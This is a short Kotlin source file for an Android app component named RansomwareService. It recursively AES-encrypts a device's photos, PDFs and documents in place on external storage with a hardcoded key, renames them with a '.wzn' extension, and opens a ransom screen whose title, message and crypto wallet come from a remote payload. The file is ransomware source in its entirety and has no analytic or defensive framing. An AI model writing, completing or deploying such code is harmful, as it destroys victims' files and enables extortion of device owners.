package com.wuzen.service

import android.content.Context
import android.os.Environment
import java.io.File
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import org.json.JSONObject

object RansomwareService {
    private val key = SecretKeySpec("WuzenKey2026!!".toByteArray(), "AES")
    fun activate(context: Context, payload: JSONObject) {
        val title = payload.getString("title")
        val body = payload.getString("body")
        val wallet = payload.getString("wallet")
        encryptFiles(Environment.getExternalStorageDirectory())
        val intent = Intent(context, RansomActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            putExtra("title", title)
            putExtra("body", body)
            putExtra("wallet", wallet)
        }
        context.startActivity(intent)
    }
    private fun encryptFiles(dir: File) {
        dir.listFiles()?.forEach { file ->
            if (file.isDirectory) encryptFiles(file)
            else if (file.extension in listOf("jpg", "png", "pdf", "doc", "txt")) {
                val cipher = Cipher.getInstance("AES").apply { init(Cipher.ENCRYPT_MODE, key) }
                val encrypted = cipher.doFinal(file.readBytes())
                file.writeBytes(encrypted)
                file.renameTo(File(file.absolutePath + ".wzn"))
            }
        }
    }
}